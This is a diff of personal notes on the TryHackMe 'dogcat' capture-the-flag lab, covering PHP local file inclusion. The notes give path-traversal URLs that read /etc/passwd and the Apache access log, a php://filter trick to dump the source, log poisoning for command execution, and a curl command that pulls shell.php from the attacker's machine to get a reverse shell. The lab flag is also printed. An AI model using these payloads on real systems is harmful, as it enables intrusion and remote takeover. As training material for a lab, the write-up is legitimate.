@@ -68,8 +68,8 @@ sorce code of http://$ip
 we sould notice the commands :
    <img src="cats/4.jpg">
 accessing /cats is forbidden — but using the format we found in the source code,
-
- /cats/4.jpg gives us access. This could be crucial for if we find a way to upload a file.
+'/cats/4.jpg ' 
+gives us access. This could be crucial for if we find a way to upload a file.
 
 lets try http://$IP/?view=dogs
  output:
@@ -78,11 +78,11 @@ lets try http://$IP/?view=dogs
  Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on 
 
     We gain following info:
--------------
+        -------------
   1     We are currently in the /var/www/html/ directory.
         to get to the root dir 'cd ../../../'
   2     We are currently accessing index.php and trying to include another file.
-  3     It appends .php to the parameter value: dogs => dogs.php.
+  3     It appends '.php' to the parameter value: dogs => dogs.php.
 
 Appending .php means we are limited to read PHP files.
 The only PHP files we sure exist are index.php, dog.php, and cat.php.
@@ -116,7 +116,7 @@ However, due to the restriction that only allows dog or cat as input, we need to
 
 
 This successfully returned:
-a very log string which is the base64 of the php code.
+a very long string which is the base64 of the php code.
 we will translate it using the command
 
 echo  $STR | base64 -d
@@ -128,7 +128,7 @@ the page part of the source code    'index.php'     is :
             function containsStr($str, $substr) {
                 return strpos($str, $substr) !== false;
             }
-	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php'; // add  the .php extension 
+	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';//add '.php' extension 
             if(isset($_GET['view'])) {
                 if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                     echo 'Here you go!';
@@ -154,18 +154,14 @@ To exploit this for Local File Inclusion (LFI), we can upgrade our payload to by
 
 
 LFI = Local File Includes 
-https://apt2002.medium.com/tryhackme-dogcat-ctf-detailed-walkthrough-cd746fd232ef
-
-
-
-https://youtu.be/u_uuk7FWWF4?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=355
  
 passward file 
 http://IP/?view=dog/../../../../../../etc/passwd&ext=
 http://IP/?view=dog/../../../../../../etc/pam.conf&ext=
-access.log file
-http://10.10.15.63/?view=dog/../../../../../../var/log/apache2/access.log&ext=
-http://10.82.177.61/?view=dog/../../../../../../var/log/apache2/access.log&ext&c=id
+
+access.log file:
+http://IP/?view=dog/../../../../../../var/log/apache2/access.log&ext=
+http://IP/?view=dog/../../../../../../var/log/apache2/access.log&ext&c=id
 flag file
 ?view=php://filter/read=convert.base64-encode/resource=dog/../flag
 
@@ -200,10 +196,13 @@ open new terminal
    in fire fox run: 
  http://$IP/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o shell.php {TUN0}:8000/shell.php
  
- This will Download the shell.php from out mechine to the addres we are attacking.
+ Not working
+ ---------------------------------
+ 
+ This will Download the shell.php from our mechine to the addres we are attacking.
 
 so now the shell.php file si on that address.
-to ran the shall.php run: http://$IP/shall.php 
+to ran the shall.php run: http://$IP/shell.php 
 
 move to the listner terminal an you can run commands
  
@@ -240,17 +239,7 @@ echo  PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo | 
 output: <?php
 $flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
 
-
-
- https://youtu.be/u_uuk7FWWF4?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=853
-
-https://fnginfosec.github.io/tryhackme/2020/07/22/dogcat.html
+  
 
 
  
- 
- http://10.80.139.226/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o shell.php 192.168.128.59:9999/shell.php
- 
- 
-
-
